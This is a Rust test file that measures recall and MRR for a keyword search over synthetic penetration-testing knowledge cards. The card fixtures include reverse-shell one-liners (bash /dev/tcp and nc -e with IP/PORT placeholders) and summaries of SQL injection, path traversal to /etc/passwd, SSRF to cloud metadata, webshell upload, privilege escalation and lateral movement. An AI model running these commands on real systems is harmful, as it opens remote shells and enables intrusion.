#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::print_stdout,
    clippy::doc_markdown,
    clippy::too_many_lines,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss
)]

//! 知识检索评测（§32-33）：固定语料 + 标注查询 → Recall@5/10/20 + MRR。
//!
//! 语料为内嵌合成卡片（覆盖 spec 要求的全部查询类别），查询-相关集
//! 标注内嵌。断言阈值是**冒烟下限**（lexical-only 阶段的诚实底线），
//! 完整数字每次运行打印；fixture 扩充后阈值再逐步收紧。

use std::path::PathBuf;

use models::{KnowledgeCard, KnowledgeRetrievalQuery};
use storage::{Repository, SqliteRepository, pack_knowledge};

fn temp_repo(tag: &str) -> (tempfile::TempDir, SqliteRepository) {
    let dir = tempfile::TempDir::with_prefix(format!("retrieval_eval_{tag}_"))
        .expect("临时目录必须可创建");
    let repo =
        SqliteRepository::open(dir.path().join("eval.sqlite3")).expect("内存文件库必须可打开");
    (dir, repo)
}

/// 一张评测卡的 JSON（wire 形态），`id` 由本测试约定为 `k_eval_*`。
fn card_json(id: &str, value: serde_json::Value) -> KnowledgeCard {
    let mut card: KnowledgeCard =
        serde_json::from_value(value).expect("评测卡必须是合法 wire 形态");
    card.id = models::KnowledgeCardId::new(id.to_string());
    card
}

/// 固定评测语料：正例覆盖 spec §32 的类别，填充卡制造排序难度。
fn corpus() -> Vec<KnowledgeCard> {
    let items: Vec<(&str, serde_json::Value)> = vec![
        (
            "k_eval_sqli_union",
            serde_json::json!({
                "kind": "payload_strategy", "title": "MySQL union 注入验证",
                "summary": "Union based SQL injection：通过 UNION SELECT 判断列数并读取 information_schema 元数据。",
                "body": "步骤：1) order by 探列数 2) union select 定位回显位 3) 读取 @@version 与 information_schema.tables。",
                "content": "Union based SQL injection：通过 UNION SELECT 判断列数并读取 information_schema 元数据。",
                "aliases": ["sql injection", "SQLi", "SQL注入"], "tags": ["web", "sqli", "mysql"],
                "tool": ["sqlmap"], "technique": ["sqli"], "platform": ["web"], "protocol": ["http"],
            }),
        ),
        (
            "k_eval_sqli_error",
            serde_json::json!({
                "kind": "payload_strategy", "title": "报错注入 extractvalue",
                "summary": "Error based SQL injection：extractvalue/updatexml 报错回显敏感数据。",
                "content": "Error based SQL injection：extractvalue/updatexml 报错回显敏感数据。",
                "aliases": ["SQL注入"], "tags": ["web", "sqli"], "technique": ["sqli"], "platform": ["web"],
            }),
        ),
        (
            "k_eval_sqli_waf",
            serde_json::json!({
                "kind": "payload_strategy", "title": "WAF bypass for SQLi",
                "summary": "SQL injection WAF bypass：内联注释、大小写混合、编码变形绕过过滤。",
                "content": "SQL injection WAF bypass：内联注释、大小写混合、编码变形绕过过滤。",
                "tags": ["web", "sqli", "waf"], "technique": ["sqli"], "platform": ["web"],
            }),
        ),
        (
            "k_eval_cve_21412",
            serde_json::json!({
                "kind": "vulnerability_pattern", "title": "CVE-2024-21412 Windows SmartScreen bypass",
                "summary": "CVE-2024-21412：Internet Shortcut Files 绕过 SmartScreen 提示，需搭配初始访问载荷。",
                "content": "CVE-2024-21412：Internet Shortcut Files 绕过 SmartScreen 提示，需搭配初始访问载荷。",
                "tags": ["cve", "windows"], "platform": ["windows"], "technique": ["initial-access"],
            }),
        ),
        (
            "k_eval_cmd_inj",
            serde_json::json!({
                "kind": "vulnerability_pattern", "title": "OS command injection (CWE-78)",
                "summary": "CWE-78 命令注入：分号/管道/反引号拼接系统命令，注意 shell 元字符过滤。",
                "content": "CWE-78 命令注入：分号/管道/反引号拼接系统命令，注意 shell 元字符过滤。",
                "aliases": ["command injection", "命令注入"], "tags": ["web", "cmd"], "technique": ["cmdinj"],
            }),
        ),
        (
            "k_eval_potato",
            serde_json::json!({
                "kind": "payload_strategy", "title": "JuicyPotatoNG 提权",
                "summary": "Windows privilege escalation：JuicyPotatoNG 利用 SeImpersonatePrivilege NTLM relay 到 SYSTEM。",
                "content": "Windows privilege escalation：JuicyPotatoNG 利用 SeImpersonatePrivilege NTLM relay 到 SYSTEM。",
                "aliases": ["privesc", "提权", "hot potato"], "tags": ["windows", "privesc"],
                "technique": ["privesc"], "platform": ["windows"],
            }),
        ),
        (
            "k_eval_seimpersonate",
            serde_json::json!({
                "kind": "case_reference", "title": "SeImpersonatePrivilege 滥用检查单",
                "summary": "whoami /priv 出现 SeImpersonatePrivilege 时优先尝试 potato 家族提权。",
                "content": "whoami /priv 出现 SeImpersonatePrivilege 时优先尝试 potato 家族提权。",
                "tags": ["windows", "privesc"], "technique": ["privesc"], "platform": ["windows"],
            }),
        ),
        (
            "k_eval_suid",
            serde_json::json!({
                "kind": "payload_strategy", "title": "SUID 提权排查",
                "summary": "Linux privilege escalation：find / -perm -4000 枚举 SUID 二进制，结合 GTFOBins 利用。",
                "content": "Linux privilege escalation：find / -perm -4000 枚举 SUID 二进制，结合 GTFOBins 利用。",
                "aliases": ["privesc", "提权"], "tags": ["linux", "privesc"], "technique": ["privesc"],
                "platform": ["linux"],
            }),
        ),
        (
            "k_eval_lateral_smb",
            serde_json::json!({
                "kind": "payload_strategy", "title": "SMB 横向移动",
                "summary": "Lateral movement：psexec/wmiexec 横向，优先 445/SMB 与管理共享可达性探测。",
                "content": "Lateral movement：psexec/wmiexec 横向，优先 445/SMB 与管理共享可达性探测。",
                "aliases": ["lateral movement", "横向移动", "内网横向"], "tags": ["intranet", "smb"],
                "technique": ["lateral"], "platform": ["windows"], "protocol": ["smb"],
            }),
        ),
        (
            "k_eval_lateral_wmi",
            serde_json::json!({
                "kind": "payload_strategy", "title": "WMI 横向执行",
                "summary": "内网横向：wmic process call create 在远端拉起进程，日志面低于 psexec。",
                "content": "内网横向：wmic process call create 在远端拉起进程，日志面低于 psexec。",
                "tags": ["intranet"], "technique": ["lateral"], "platform": ["windows"], "protocol": ["wmi"],
            }),
        ),
        (
            "k_eval_rev_bash",
            serde_json::json!({
                "kind": "tool_usage", "title": "bash 反弹 shell",
                "summary": "reverse shell：bash -i >& /dev/tcp/IP/PORT 0>&1，注意目标 bash 可用性。",
                "content": "reverse shell：bash -i >& /dev/tcp/IP/PORT 0>&1，注意目标 bash 可用性。",
                "aliases": ["reverse shell", "反弹 shell"], "tags": ["shell"], "platform": ["linux"],
                "technique": ["revshell"],
            }),
        ),
        (
            "k_eval_rev_nc",
            serde_json::json!({
                "kind": "tool_usage", "title": "nc/e 反弹 shell",
                "summary": "反弹 shell：nc -e /bin/bash IP PORT；无 -e 时用 mkfifo 命名管道变体。",
                "content": "反弹 shell：nc -e /bin/bash IP PORT；无 -e 时用 mkfifo 命名管道变体。",
                "aliases": ["reverse shell"], "tags": ["shell"], "technique": ["revshell"],
            }),
        ),
        (
            "k_eval_xss_reflected",
            serde_json::json!({
                "kind": "vulnerability_pattern", "title": "反射型 XSS 验证",
                "summary": "Cross-site scripting：反射点构造 <script> 与事件属性 payload，验证输出编码缺失。",
                "content": "Cross-site scripting：反射点构造 <script> 与事件属性 payload，验证输出编码缺失。",
                "aliases": ["xss", "跨站脚本"], "tags": ["web"], "technique": ["xss"], "platform": ["web"],
            }),
        ),
        (
            "k_eval_ssrf_metadata",
            serde_json::json!({
                "kind": "payload_strategy", "title": "SSRF 打云元数据",
                "summary": "SSRF：利用 URL 回取访问 169.254.169.254 云元数据与内网服务。",
                "content": "SSRF：利用 URL 回取访问 169.254.169.254 云元数据与内网服务。",
                "aliases": ["server-side request forgery", "服务端请求伪造"], "tags": ["web", "cloud"],
                "technique": ["ssrf"], "protocol": ["http"],
            }),
        ),
        (
            "k_eval_upload_shell",
            serde_json::json!({
                "kind": "payload_strategy", "title": "任意文件上传 getshell",
                "summary": "Unrestricted file upload：绕过 MIME/扩展名校验上传 webshell，验证解析路径。",
                "content": "Unrestricted file upload：绕过 MIME/扩展名校验上传 webshell，验证解析路径。",
                "aliases": ["file upload", "文件上传", "任意文件上传"], "tags": ["web"],
                "technique": ["upload"], "platform": ["web"],
            }),
        ),
        (
            "k_eval_traversal",
            serde_json::json!({
                "kind": "vulnerability_pattern", "title": "目录穿越读文件",
                "summary": "Directory traversal：../ 序列穿越读 /etc/passwd，注意编码绕过与绝对路径截断。",
                "content": "Directory traversal：../ 序列穿越读 /etc/passwd，注意编码绕过与绝对路径截断。",
                "aliases": ["path traversal", "目录穿越", "LFI"], "tags": ["web"], "technique": ["traversal"],
            }),
        ),
        (
            "k_eval_sqlmap",
            serde_json::json!({
                "kind": "tool_usage", "title": "sqlmap 基础用法",
                "summary": "sqlmap -u <url> --batch --level 3 --risk 2：自动化 SQL injection 检测与利用。",
                "content": "sqlmap -u <url> --batch --level 3 --risk 2：自动化 SQL injection 检测与利用。",
                "tags": ["tool", "sqli"], "tool": ["sqlmap"], "technique": ["sqli"],
            }),
        ),
        // —— 填充卡（制造排序难度，不进入任何相关集）——
        (
            "k_eval_nmap",
            serde_json::json!({
                "kind": "tool_usage", "title": "nmap 服务探测",
                "summary": "nmap -sV -p- --script default：端口与服务版本扫描基线。",
                "content": "nmap -sV -p- --script default：端口与服务版本扫描基线。",
                "tags": ["recon"], "tool": ["nmap"],
            }),
        ),
        (
            "k_eval_docker",
            serde_json::json!({
                "kind": "remediation_pattern", "title": "Docker 容器加固基线",
                "summary": "容器以非 root 运行、只读根文件系统、限制 capabilities 与 seccomp。",
                "content": "容器以非 root 运行、只读根文件系统、限制 capabilities 与 seccomp。",
                "tags": ["hardening"],
            }),
        ),
        (
            "k_eval_wireshark",
            serde_json::json!({
                "kind": "tool_usage", "title": "Wireshark 流量分析",
                "summary": "显示过滤器 http.request / tls.handshake.type 用于流量研判。",
                "content": "显示过滤器 http.request / tls.handshake.type 用于流量研判。",
                "tags": ["traffic"], "tool": ["wireshark"], "protocol": ["http"],
            }),
        ),
        (
            "k_eval_falsepos",
            serde_json::json!({
                "kind": "false_positive_pattern", "title": "扫描器误报：反射点含转义",
                "summary": "输出被 HTML 实体转义且无执行上下文时，XSS 反射点判为误报。",
                "content": "输出被 HTML 实体转义且无执行上下文时，XSS 反射点判为误报。",
                "tags": ["false-positive", "web"], "technique": ["xss"],
            }),
        ),
        (
            "k_eval_deser_java",
            serde_json::json!({
                "kind": "vulnerability_pattern", "title": "Java 反序列化 gadget",
                "summary": "Insecure deserialization：Commons-Collections gadget 链触发 RCE 的排查路径。",
                "content": "Insecure deserialization：Commons-Collections gadget 链触发 RCE 的排查路径。",
                "aliases": ["deserialization", "反序列化"], "tags": ["java"], "technique": ["deser"],
            }),
        ),
        (
            "k_eval_kerberoast",
            serde_json::json!({
                "kind": "payload_strategy", "title": "Kerberoasting 服务票据",
                "summary": "凭据获取：请求 SPN 账户票据离线爆破，优先高权限服务账户。",
                "content": "凭据获取：请求 SPN 账户票据离线爆破，优先高权限服务账户。",
                "aliases": ["credential access", "kerberoast"], "tags": ["intranet", "ad"],
                "technique": ["cred"], "protocol": ["kerberos"],
            }),
        ),
        (
            "k_eval_git",
            serde_json::json!({
                "kind": "case_reference", "title": "git 提交规范",
                "summary": "conventional commits：feat/fix/chore 前缀与 scope 书写约定。",
                "content": "conventional commits：feat/fix/chore 前缀与 scope 书写约定。",
                "tags": ["workflow"],
            }),
        ),
    ];
    items
        .into_iter()
        .map(|(id, value)| card_json(id, value))
        .collect()
}

/// 一条评测查询：`relevant` = 期望进入 top-K 的卡；`forbidden` =
/// 不得出现在 top-K 的卡（噪声守卫）。
struct EvalCase {
    label: &'static str,
    query: &'static str,
    relevant: &'static [&'static str],
    forbidden: &'static [&'static str],
}

fn eval_cases() -> Vec<EvalCase> {
    vec![
        EvalCase {
            // 中文自然语言 + 跨语言命中英文别名组
            label: "zh-nl-sqli",
            query: "如何利用 SQL 注入读取数据库版本",
            relevant: &["k_eval_sqli_union", "k_eval_sqli_error", "k_eval_sqlmap"],
            forbidden: &["k_eval_git", "k_eval_docker"],
        },
        EvalCase {
            // 英文 + 同义词（SQLi → sql injection 组展开）
            label: "en-synonym-sqli",
            query: "SQLi bypass WAF filter",
            relevant: &["k_eval_sqli_waf", "k_eval_sqli_union"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // exact CVE
            label: "exact-cve",
            query: "CVE-2024-21412 exploitation steps",
            relevant: &["k_eval_cve_21412"],
            forbidden: &["k_eval_sqli_union"],
        },
        EvalCase {
            // exact CWE
            label: "exact-cwe",
            query: "CWE-78 mitigation",
            relevant: &["k_eval_cmd_inj"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // Windows 提权（privilege 名称原样保留）
            label: "win-privesc",
            query: "windows privilege escalation SeImpersonatePrivilege potato",
            relevant: &["k_eval_potato", "k_eval_seimpersonate"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // Linux 提权
            label: "linux-privesc",
            query: "linux privesc SUID enumeration",
            relevant: &["k_eval_suid", "k_eval_potato"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // 中英混合：横向移动
            label: "mixed-lateral",
            query: "内网横向 movement via smb",
            relevant: &["k_eval_lateral_smb", "k_eval_lateral_wmi"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // reverse shell 双语
            label: "revshell",
            query: "reverse shell 反弹 bash",
            relevant: &["k_eval_rev_bash", "k_eval_rev_nc"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // XSS 双语
            label: "xss",
            query: "xss 跨站脚本 cookie stealing",
            relevant: &["k_eval_xss_reflected"],
            forbidden: &["k_eval_git", "k_eval_docker"],
        },
        EvalCase {
            // SSRF
            label: "ssrf",
            query: "SSRF cloud metadata endpoint",
            relevant: &["k_eval_ssrf_metadata"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // file upload 中英混合
            label: "upload",
            query: "file upload getshell 上传 webshell",
            relevant: &["k_eval_upload_shell"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // traversal
            label: "traversal",
            query: "directory traversal etc/passwd",
            relevant: &["k_eval_traversal"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // CLI flag
            label: "cli-flag",
            query: "sqlmap --level 风险等级",
            relevant: &["k_eval_sqlmap", "k_eval_sqli_union"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // 纯中文同义词
            label: "zh-synonym-lateral",
            query: "横向移动 psexec",
            relevant: &["k_eval_lateral_smb", "k_eval_lateral_wmi"],
            forbidden: &["k_eval_git"],
        },
        EvalCase {
            // 英文同义词
            label: "en-synonym-upload",
            query: "unrestricted file upload exploitation",
            relevant: &["k_eval_upload_shell"],
            forbidden: &["k_eval_git"],
        },
    ]
}

#[derive(Debug)]
struct Metrics {
    recall_at_5: f64,
    recall_at_10: f64,
    recall_at_20: f64,
    mrr: f64,
    per_query: Vec<(&'static str, f64, f64, f64, f64)>,
}

/// 跑评测并打印逐项指标（数字是实测输出，不伪造）。
#[test]
fn retrieval_eval_recall_and_mrr() {
    let (_dir, repo) = temp_repo("main");
    for card in corpus() {
        repo.add_knowledge_card(&card).expect("语料必须可写入");
    }

    let mut per_query = Vec::new();
    for case in eval_cases() {
        let mut query = KnowledgeRetrievalQuery::new();
        query.text = case.query.to_string();
        query.limit = 20;
        let results = repo.search_knowledge_cards(&query).expect("检索必须成功");
        assert!(results.len() <= 20, "limit 契约：返回条数不得超过查询上限");
        let rank_of = |target: &str| -> Option<usize> {
            results
                .iter()
                .position(|result| result.card.id.as_str() == target)
                .map(|index| index + 1)
        };
        let recall_at = |k: usize| -> f64 {
            if case.relevant.is_empty() {
                return 1.0;
            }
            let hits = case
                .relevant
                .iter()
                .filter(|target| rank_of(target).is_some_and(|rank| rank <= k))
                .count();
            f64::from(hits as i32) / f64::from(case.relevant.len() as i32)
        };
        let mrr = case
            .relevant
            .iter()
            .filter_map(|target| rank_of(target))
            .map(|rank| 1.0 / rank as f64)
            .fold(0.0, f64::max);
        for noise in case.forbidden {
            let rank = rank_of(noise);
            assert!(
                rank.is_none_or(|rank| rank > 20),
                "查询 '{}' 的噪声卡 {noise} 不得进入 top-20（实际 rank {rank:?}）",
                case.label
            );
        }
        per_query.push((case.label, recall_at(5), recall_at(10), recall_at(20), mrr));
    }

    let mean = |index: usize| {
        per_query
            .iter()
            .map(|row| match index {
                1 => row.1,
                2 => row.2,
                3 => row.3,
                _ => row.4,
            })
            .sum::<f64>()
            / per_query.len() as f64
    };
    let metrics = Metrics {
        recall_at_5: mean(1),
        recall_at_10: mean(2),
        recall_at_20: mean(3),
        mrr: mean(4),
        per_query,
    };

    println!("\n=== Knowledge Retrieval Eval（lexical FTS5+aliases，preliminary）===");
    for (label, r5, r10, r20, mrr) in &metrics.per_query {
        println!("{label:>24}  R@5={r5:.3}  R@10={r10:.3}  R@20={r20:.3}  MRR={mrr:.3}");
    }
    println!(
        "MEAN  R@5={:.3}  R@10={:.3}  R@20={:.3}  MRR={:.3}",
        metrics.recall_at_5, metrics.recall_at_10, metrics.recall_at_20, metrics.mrr
    );

    // —— 冒烟下限：lexical-only 阶段的诚实底线，fixture 扩充后收紧 ——
    assert!(
        metrics.recall_at_10 >= 0.75,
        "Recall@10 低于冒烟下限：{:.3}",
        metrics.recall_at_10
    );
    assert!(
        metrics.recall_at_5 >= 0.6,
        "Recall@5 低于冒烟下限：{:.3}",
        metrics.recall_at_5
    );
    assert!(metrics.mrr >= 0.55, "MRR 低于冒烟下限：{:.3}", metrics.mrr);
}

/// context packing 主路冒烟：检索结果经打包后条数/预算约束成立。
#[test]
fn packed_injection_respects_limits() {
    let _unused = PathBuf::new(); // 保持导入最小化
    let (_dir, repo) = temp_repo("packing");
    for card in corpus() {
        repo.add_knowledge_card(&card).expect("语料必须可写入");
    }
    let mut query = KnowledgeRetrievalQuery::new();
    query.text = "SQL injection 提权 lateral".to_string();
    query.limit = 24;
    let results = repo.search_knowledge_cards(&query).expect("检索必须成功");
    let packed = pack_knowledge(&results, &storage::PackOptions::default());
    assert!(packed.len() <= 8, "打包条数不得超过默认 max_units=8");
    for item in &packed {
        assert!(!item.injection_text.is_empty(), "注入单元不得为空");
    }
}
